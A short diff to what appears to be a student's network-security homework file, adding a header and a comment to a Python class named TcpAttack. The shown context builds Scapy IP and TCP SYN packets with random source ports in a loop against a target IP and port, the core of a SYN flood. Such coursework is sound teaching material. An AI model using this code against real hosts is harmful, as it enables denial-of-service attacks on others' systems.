@@ -1,3 +1,8 @@
+#Homework Number: 8
+#Name: Dylan Huynh
+#ECN login: huynh38
+#Due Date: 3/21/2023
+
 import sys, socket
 import re
 import os.path
@@ -53,7 +58,7 @@ class TcpAttack():
         destIP   = self.targetIP                                                     #(2)
         destPort = port                                                 #(3)
         count    = numSyn                                                 #(4)
-
+        #Uses Scapy functions to send out Packets
         for i in range(count):                                                       #(5)
             IP_header = IP(src = srcIP, dst = destIP)                                #(6)
             TCP_header = TCP(flags = "S", sport = RandShort(), dport = destPort)     #(7)
